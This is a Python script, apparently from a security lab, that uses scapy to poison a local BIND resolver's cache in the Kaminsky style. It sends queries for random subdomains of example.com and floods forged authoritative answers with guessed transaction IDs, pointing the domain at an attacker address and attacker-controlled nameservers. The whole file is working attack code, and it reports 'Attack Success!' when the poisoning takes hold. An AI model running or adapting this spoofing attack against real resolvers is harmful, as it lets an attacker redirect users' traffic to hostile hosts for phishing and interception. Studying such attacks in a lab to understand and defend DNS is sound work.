#!/usr/bin/env python
import argparse
import socket

from scapy.all import DNS, DNSQR, DNSRR
from random import randint, choice
from string import ascii_lowercase, digits

SPROOF_ADDR = "5.6.6.8"
SPROOF_NS_1 = "ns1.dnsattacker.net"
SPROOF_NS_2 = "ns2.dnsattacker.net"

DNS_HOSTS = {
    b"example.com.": SPROOF_ADDR,
}

parser = argparse.ArgumentParser()
parser.add_argument(
    "--dns_port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument(
    "--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()


# BIND's addr
DNS_ADDR = "127.0.0.1"
# your bind's port (DNS queries are send to this port)
DNS_PORT = args.dns_port #7070

# port that your bind uses to send its DNS queries
my_query_port = args.query_port #5055

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
    return ''.join(choice(ascii_lowercase + digits) for _ in range(10))
DOMAIN = "example.com"
SUB_DOMAIN = getRandomSubDomain() + '.' + DOMAIN

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
    return randint(0, 256)


'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(bytes(packet), (ip, port))  #bytes(packet)


'''
Example code that sends a DNS query using scapy.
'''
def sendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    dnsPacket = DNS(rd=1, qd=DNSQR(qname=SUB_DOMAIN))
    sendPacket(sock, dnsPacket, DNS_ADDR, DNS_PORT)
    return sock

def spoofDNS():
    dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # print("Sub Domain", SUB_DOMAIN)
    Qdsec = DNSQR(qname=SUB_DOMAIN)
    Anssec = DNSRR(rrname=SUB_DOMAIN, type='A', rdata=SPROOF_ADDR, ttl=68900)
    dns = DNS(id=getRandomTXID(), aa=1, rd=0, qr=1,
                                  qdcount=1, ancount=1, nscount=2, arcount=0,
                                  qd=Qdsec, 
                                  an=Anssec,
                                  ns=DNSRR(rrname=b'example.com', rdata=SPROOF_NS_1, type='NS')/DNSRR(rrname=b"example.com", type='NS', rdata=SPROOF_NS_2) )
    response = dns

    response.getlayer(DNS).qd.qname = SUB_DOMAIN
    for _ in range(125):
		# Set random TXID from 0 to 255
        response.getlayer(DNS).id = getRandomTXID()
        sendPacket(dns_sock, response, DNS_ADDR, my_query_port)
    dns_sock.close()

if __name__ == '__main__':
    while True:
        SUB_DOMAIN = getRandomSubDomain() + '.' + DOMAIN
        sock = sendDNSQuery()
        spoofDNS()
        data, (addr, port) = sock.recvfrom(4096)
        resp = DNS(data)
        if resp[DNS].an and resp[DNS].an.rdata == SPROOF_ADDR:
            print("Attack Success!")
            sock.close()
            break
